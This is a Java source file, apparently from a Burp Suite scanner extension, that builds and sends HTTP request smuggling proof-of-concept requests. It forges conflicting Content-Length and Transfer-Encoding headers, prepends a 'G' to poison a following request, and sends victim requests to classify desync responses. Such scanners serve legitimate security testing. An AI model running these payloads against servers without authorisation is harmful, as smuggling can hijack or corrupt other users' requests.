package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public abstract class SmuggleScanBox extends Scan {

    SmuggleScanBox(String name) {
        super(name);
    }

    boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service) {
        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service);
    }

    boolean sendPoc(String name, String setupAttack, byte[] victim, IHttpService service) {
        try {
            Resp baseline = request(service, victim);
            SmuggleHelper helper = new SmuggleHelper(service);
            helper.queue(setupAttack);
            helper.queue(Utilities.helpers.bytesToString(victim));
            helper.queue(Utilities.helpers.bytesToString(victim));

            List<Resp> results = helper.waitFor();
            Resp cleanup = null;
            for (int i=0;i<3;i++) {
                cleanup = request(service, victim);
                if (cleanup.getInfo().getStatusCode() != baseline.getInfo().getStatusCode()) {
                    request(service, victim);
                    break;
                }
            }
            short cleanupStatus = cleanup.getStatus();
            short minerStatus = results.get(0).getStatus();
            short victimStatus = results.get(1).getStatus();

            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
                return false;
            }

            if (cleanupStatus == minerStatus) {
                if (victimStatus == 0) {
                    report("Null victim: "+name, "code1:code1:code2", cleanup, results.get(0), results.get(1));
                }
                else {
                    report("Req smuggling attack (legit): "+name, "code1:code1:code2", cleanup, results.get(0), results.get(1));
                }
            } else if (minerStatus == victimStatus) {
                report("Req smuggling attack (XCON): "+name, "code1:code2:code2", cleanup, results.get(0), results.get(1));
            } else if (cleanupStatus == victimStatus) {
                report("Probably nothing: "+name, "code1:code2:code1", cleanup, results.get(0), results.get(1));
            } else {
                report("Req smuggling attack (hazardous): "+name, "code1:code2:code3", cleanup, results.get(0), results.get(1));
            }

            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
            return true;
        }
        catch (Exception e) {
            return false;
        }
    }

    static Resp buildPoc(byte[] req, IHttpService service) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0));
            return new Resp(new Req(buf.toByteArray(), null, service));
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    static byte[] gzipBody(byte[] baseReq) {
        try {
            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
            String body = Utilities.getBody(req);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(out);
            gzip.write(Utilities.helpers.stringToBytes(body));
            gzip.close();
            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
        } catch (Exception e) {
            Utilities.err(e.getMessage());
            return baseReq;
        }
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        if (!Utilities.containsBytes("Transfer-Encoding".getBytes(), baseReq)) {
            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
        }

        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
        return chunkedReq;
    }
}
